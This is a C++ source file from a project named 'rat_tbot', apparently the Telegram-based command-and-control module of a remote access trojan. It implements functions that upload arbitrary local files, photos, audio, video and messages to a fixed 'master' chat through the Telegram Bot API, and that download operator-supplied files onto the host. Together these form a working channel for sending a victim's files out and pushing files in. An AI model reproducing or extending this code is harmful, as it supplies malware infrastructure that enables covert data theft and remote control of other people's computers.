/*rat_tbot/src/tbot.cpp*/
#include "rat/tbot/tbot.hpp"
#include "rat/networking.hpp"

#include <cstring>
#include <curl/curl.h>
#include <fmt/core.h>
#include <filesystem>
#include <fstream>

#include "logging.hpp"
#include "rat/tbot/types.hpp"

#include <simdjson.h>

namespace rat::tbot {

BaseBot::BaseBot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Connection_Timeout)
    : token(arg_Token),
      master_id(Master_Id),
      curl_client() {
    this->sending_message_url_base = fmt::format("{}{}/sendMessage?chat_id={}&text=", TELEGRAM_BOT_API_BASE_URL, token,master_id);
    
    this->sending_document_url     = fmt::format("{}{}/sendDocument", TELEGRAM_BOT_API_BASE_URL, token);
    this->sending_photo_url        = fmt::format("{}{}/sendPhoto", TELEGRAM_BOT_API_BASE_URL, token);
    
    this->sending_audio_url        = fmt::format("{}{}/sendAudio", TELEGRAM_BOT_API_BASE_URL, token);
    this->sending_video_url        = fmt::format("{}{}/sendVideo", TELEGRAM_BOT_API_BASE_URL, token);
    
    this->sending_voice_url        = fmt::format("{}{}/sendVoice", TELEGRAM_BOT_API_BASE_URL, token);
    this->getting_file_url         = fmt::format("{}{}/getFile?file_id=", TELEGRAM_BOT_API_BASE_URL, token);

    this->update_interval = 1000;
    this->last_update_id = 0;
}

/*This is the root of the bug of the asynchronous /get behavior not functioning, I ingored constructing those links */
BaseBot::BaseBot(const BaseBot& Other_Bot)
    : token(Other_Bot.token),
      master_id(Other_Bot.master_id),
      
      sending_message_url_base(Other_Bot.sending_message_url_base),
      sending_document_url(Other_Bot.sending_document_url),
      sending_photo_url(Other_Bot.sending_photo_url),        
      sending_audio_url(Other_Bot.sending_audio_url),        
      sending_video_url(Other_Bot.sending_video_url),        
      sending_voice_url(Other_Bot.sending_voice_url),            
      getting_file_url(Other_Bot.getting_file_url),
      curl_client()   // <-- copy underlying client too
    {
        this->setOffset();
        this->update_interval = Other_Bot.update_interval;

        this->last_update_id = Other_Bot.last_update_id;
    }

std::string BaseBot::getToken() const { 
    return token; 
}
int64_t BaseBot::getMasterId() const {
    return master_id; 
}
int64_t BaseBot::getLastUpdateId() const { 
    return last_update_id; 
}
void BaseBot::setLastUpdateId(int64_t arg_Id) { 
    last_update_id = arg_Id; 
}

void BaseBot::setUpdateIterval(uint16_t Update_Interval) {
    update_interval = Update_Interval;
}

std::string BaseBot::getBotFileUrl() const {
   return this->getting_file_url; 
}

void BaseBot::setOffset() {
    const std::string init_url = fmt::format("{}{}/getUpdates?offset=-1&limit=1",TELEGRAM_BOT_API_BASE_URL, token);

    const auto response = this->curl_client.sendHttpRequest(
        init_url,
        this->http_buffer,
        HTTP_RESPONSE_BUFFER_SIZE // ensure sendHttpRequest never exceeds this
    );

    if (response.size == 0 || response.curl_code != CURLE_OK) {
        ERROR_LOG("Failed to fetch updates (empty response).");
        return;
    }
    if(response.size < sizeof(this->http_buffer)) {
        std::memset(http_buffer + response.size, 0, simdjson::SIMDJSON_PADDING);
    }

    simdjson::ondemand::parser parser(HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING);
    simdjson::ondemand::document doc;
    auto error = parser.iterate(
        this->http_buffer,
        response.size,
        response.size + simdjson::SIMDJSON_PADDING
    ).get(doc);

    if (error) {
        ERROR_LOG("Failed to parse JSON (code={}): {}", int(error), simdjson::error_message(error));
        return;
    }

    // Validate "ok"
    auto ok = doc["ok"].get_bool();
    if (ok.error() || !ok.value_unsafe()) {
        ERROR_LOG("Telegram API response missing or invalid 'ok' field.");
        return;
    }

    // Extract "result"
    auto results = doc["result"].get_array();
    if (results.error()) {
        ERROR_LOG("Telegram API response missing 'result' array.");
        return;
    }

    // If no updates, that's fine (new bot, idle state, etc.)
    if (results.begin() == results.end()) {
        DEBUG_LOG("No updates available yet, offset not set.");
        return;
    }

    // Since limit=1, there’s at most one element
    auto result = *results.begin();
    auto update_id = result["update_id"].get_int64();
    if (!update_id.error() && update_id.value() > 0) {
        this->last_update_id = update_id.value();
        DEBUG_LOG("Initialized with latest update_id: {}", this->last_update_id);
    } else {
        ERROR_LOG("Failed to extract update_id from Telegram response.");
    }
}



BotResponse BaseBot::sendMessage(const std::string& Text_Message) {
    try {
        char* escaped = curl_easy_escape(nullptr, Text_Message.c_str(), static_cast<int>(Text_Message.size()));
        if (!escaped) return BotResponse::UNKNOWN_ERROR;

        const std::string url = fmt::format("{}{}", sending_message_url_base , escaped);
        curl_free(escaped);

        DEBUG_LOG("Sending message to {}", url);

        const auto response = this->curl_client.sendHttpRequest(url, this->http_buffer, HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING);

        if (response.size == 0 || response.curl_code != CURLE_OK) return BotResponse::CONNECTION_ERROR;
        if(response.size < sizeof(this->http_buffer)) {
            std::memset(http_buffer + response.size, 0, simdjson::SIMDJSON_PADDING);
        }
        simdjson::ondemand::parser simdjson_parser(response.size);
        simdjson::ondemand::document doc = simdjson_parser.iterate(http_buffer, response.size + simdjson::SIMDJSON_PADDING);
        const bool ok = doc["ok"].get_bool();
        
        return ok ? BotResponse::SUCCESS : BotResponse::UNKNOWN_ERROR;
        
    } catch (const std::exception& e) {
        ERROR_LOG("sendMessage exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}

BotResponse BaseBot::sendFile(const std::filesystem::path& File_Path, const std::string& arg_Caption) {
    try {
        if (!std::filesystem::exists(File_Path)) {
            ERROR_LOG("sendFile: file does not exist: {}", File_Path.string());
            return BotResponse::CONNECTION_ERROR;
        }

        auto file_size = std::filesystem::file_size(File_Path);
        DEBUG_LOG("sendFile: entering with '{}', size={} bytes", File_Path.string(), file_size);

        std::string extension = File_Path.extension().string();
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
        DEBUG_LOG("sendFile: detected extension '{}'", extension);

        // Route to specialized methods
        if (extension == ".jpg" || extension == ".jpeg" || extension == ".png") {
            DEBUG_LOG("sendFile: routed to sendPhoto() for {}", File_Path.string());
            return this->sendPhoto(File_Path, arg_Caption);
        }

        DEBUG_LOG("sendFile: constructing MimeContext for generic document");

        // Generic document handling
        rat::networking::MimeContext ctx;
        ctx.file_path       = File_Path;
        ctx.url             = sending_document_url;
        ctx.file_field_name = "document";
        ctx.fields_map      = { {"chat_id", std::to_string(master_id)} };

        if (!arg_Caption.empty()) {
            ctx.fields_map["caption"] = arg_Caption;
            DEBUG_LOG("sendFile: added caption '{}'", arg_Caption);
        }

        // Map common MIME types
        if      (extension == ".txt")  ctx.mime_type = "text/plain";
        else if (extension == ".mp3")  ctx.mime_type = "audio/mp3";
        else if (extension == ".ogg")  ctx.mime_type = "audio/ogg";
        else if (extension == ".mp4")  ctx.mime_type = "video/mpeg";
        else if (extension == ".pdf")  ctx.mime_type = "application/pdf";
        else if (extension == ".zip")  ctx.mime_type = "application/zip";
        else if (extension == ".rar")  ctx.mime_type = "application/vnd.rar";
        else if (extension == ".7z")   ctx.mime_type = "application/x-7z-compressed";
        else if (extension == ".csv")  ctx.mime_type = "text/csv";
        else if (extension == ".json") ctx.mime_type = "application/json";
        else if (extension == ".xml")  ctx.mime_type = "application/xml";
        else if (extension == ".doc")  ctx.mime_type = "application/msword";
        else if (extension == ".docx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        else if (extension == ".xls")  ctx.mime_type = "application/vnd.ms-excel";
        else if (extension == ".xlsx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        else if (extension == ".ppt")  ctx.mime_type = "application/vnd.ms-powerpoint";
        else if (extension == ".pptx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
        else if (extension == ".wav")  ctx.mime_type = "audio/wav";
        else if (extension == ".mov")  ctx.mime_type = "video/quicktime";
        else if (extension == ".avi")  ctx.mime_type = "video/x-msvideo";
        else ctx.mime_type             = "application/octet-stream"; // fallback

        DEBUG_LOG("sendFile: mime_type resolved to '{}'", ctx.mime_type);
        DEBUG_LOG("sendFile: invoking uploadMimeFile() for {}", File_Path.string());
        
        const auto response = this->curl_client.uploadMimeFile(ctx);

        if (response.curl_code != CURLE_OK) {
            ERROR_LOG("sendFile: uploadMimeFile() failed for '{}'", File_Path.string());
        } else {
            DEBUG_LOG("sendFile: uploadMimeFile() succeeded for '{}'", File_Path.string());
        }

        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendFile: exception '{}'", e.what());
        return BotResponse::CONNECTION_ERROR;
    } catch (...) {
        ERROR_LOG("sendFile: unknown exception");
        return BotResponse::CONNECTION_ERROR;
    }
}


BotResponse BaseBot::sendPhoto(const std::filesystem::path& Photo_Path, const std::string& arg_Caption) {
    try {
        DEBUG_LOG("Uploading photo: {}", Photo_Path.string());
        
        rat::networking::MimeContext ctx;
        ctx.file_path = Photo_Path;
        ctx.url = sending_photo_url;  // URL without chat_id now
        ctx.file_field_name = "photo";
        ctx.fields_map = {
            {"chat_id", std::to_string(master_id)}
        };
        
        const auto response = this->curl_client.uploadMimeFile(ctx);
        if (response.curl_code != CURLE_OK) {
            ERROR_LOG("Failed at uploading {}", Photo_Path.string());
        }
        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
    } catch (const std::exception& e) {
        ERROR_LOG("sendPhoto exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}
// ------------------------ Audio ------------------------
BotResponse BaseBot::sendAudio(const std::filesystem::path& Audio_Path, const std::string& arg_Caption) {
    try {
        DEBUG_LOG("Uploading audio: {}", Audio_Path.string());

        rat::networking::MimeContext ctx;
        ctx.file_path       = Audio_Path;
        ctx.url             = sending_audio_url;  // Telegram API sendAudio endpoint
        ctx.file_field_name = "audio";
        ctx.fields_map = {
            {"chat_id", std::to_string(master_id)}
        };

        if (!arg_Caption.empty()) {
            ctx.fields_map["caption"] = arg_Caption;
        }

        // Optionally set MIME type
        ctx.mime_type = "audio/mpeg"; // default for mp3/m4a

        const auto response = this->curl_client.uploadMimeFile(ctx);
        if (response.curl_code != CURLE_OK) {
            ERROR_LOG("Failed at uploading audio: {}", Audio_Path.string());
        }
        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendAudio exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}

// ------------------------ Video ------------------------
BotResponse BaseBot::sendVideo(const std::filesystem::path& Video_Path, const std::string& arg_Caption) {
    try {
        DEBUG_LOG("Uploading video: {}", Video_Path.string());

        rat::networking::MimeContext ctx;
        ctx.file_path       = Video_Path;
        ctx.url             = sending_video_url;  // Telegram API sendVideo endpoint
        ctx.file_field_name = "video";
        ctx.fields_map = {
            {"chat_id", std::to_string(master_id)}
        };

        if (!arg_Caption.empty()) {
            ctx.fields_map["caption"] = arg_Caption;
        }

        ctx.mime_type = "video/mp4"; // default for mp4

        const auto response = this->curl_client.uploadMimeFile(ctx);
        if (response.curl_code != CURLE_OK) {
            ERROR_LOG("Failed at uploading video: {}", Video_Path.string());
        }
        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendVideo exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}

// ------------------------ Voice ------------------------
BotResponse BaseBot::sendVoice(const std::filesystem::path& Voice_Path, const std::string& arg_Caption) {
    try {
        DEBUG_LOG("Uploading voice message: {}", Voice_Path.string());

        rat::networking::MimeContext ctx;
        ctx.file_path       = Voice_Path;
        ctx.url             = sending_voice_url;  // Telegram API sendVoice endpoint
        ctx.file_field_name = "voice";
        ctx.fields_map = {
            {"chat_id", std::to_string(master_id)}
        };

        if (!arg_Caption.empty()) {
            ctx.fields_map["caption"] = arg_Caption;
        }

        ctx.mime_type = "audio/ogg"; // default for Telegram voice messages

        const auto response = this->curl_client.uploadMimeFile(ctx);
        if (response.curl_code != CURLE_OK) {
            ERROR_LOG("Failed at uploading voice message: {}", Voice_Path.string());
        }
        return response.curl_code == CURLE_OK ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;

    } catch (const std::exception& e) {
        ERROR_LOG("sendVoice exception: {}", e.what());
        return BotResponse::CONNECTION_ERROR;
    }
}

bool BaseBot::downloadFile(const std::string& File_Id, const std::filesystem::path& Out_Path) {
    const std::string get_file_url = fmt::format("{}{}", getting_file_url, File_Id);

    const auto response = this->curl_client.sendHttpRequest(
        get_file_url.c_str(),
        this->http_buffer,
        HTTP_RESPONSE_BUFFER_SIZE + simdjson::SIMDJSON_PADDING
    );

    if (response.curl_code != CURLE_OK || response.size == 0) return false;

    DEBUG_LOG("HTTP response received ({} bytes): {}", response.size, this->http_buffer);

        // Fetch JSON metadata into a std::string
    std::string json_raw;
    {
        std::vector<char> buffer;
        buffer.reserve(1024);
        auto response = this->curl_client.sendHttpRequest(get_file_url.c_str(), buffer);
        if (response.curl_code != CURLE_OK || response.size == 0) return false;

        json_raw.assign(buffer.begin(), buffer.begin() + response.size);
    }

    // Convert to simdjson::padded_string
    simdjson::padded_string padded_json = simdjson::padded_string(json_raw);

    // Parse safely
    simdjson::ondemand::parser parser;
    simdjson::ondemand::document doc = parser.iterate(padded_json);
    if (!doc["ok"].get_bool()) return false;

    const std::string_view file_path = doc["result"]["file_path"].get_string();
    const std::string file_url = fmt::format("{}/file/bot{}/{}", TELEGRAM_API_URL, token, file_path);

    const std::filesystem::path file_name = std::filesystem::path(file_path).filename();
    const auto download_response = this->curl_client.download(file_url, std::filesystem::current_path() / file_name);

    return download_response.curl_code == CURLE_OK;
}

} // namespace rat::tbot
